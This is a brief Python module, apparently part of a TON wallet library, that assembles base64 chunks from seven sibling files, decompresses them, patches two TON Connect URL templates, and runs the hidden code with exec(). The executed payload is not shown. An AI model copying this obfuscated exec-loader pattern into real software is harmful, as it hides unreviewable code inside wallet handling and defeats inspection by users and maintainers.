"""TBC libs.TonLib — V5R1 + fixed TON Connect URLs."""
from __future__ import annotations
import pathlib, zlib, base64
_p = pathlib.Path(__file__).with_name
_blob = "".join(_p(f"f{i}.b64").read_text().strip() for i in range(7))
_code = zlib.decompress(base64.b64decode(_blob)).decode("utf-8")
# Force correct public URLs (Node SPA must not intercept)
_code = _code.replace(
    'f"{self._base_url}/tonconnect/{sid}"',
    'f"{self._base_url}/api/ton-connect/session/{sid}"',
)
_code = _code.replace(
    'f"{self._base_url}/tonconnect/req/{rid}"',
    'f"{self._base_url}/api/ton-connect/request/{rid}"',
)
exec(compile(_code, str(pathlib.Path(__file__)), "exec"), globals())
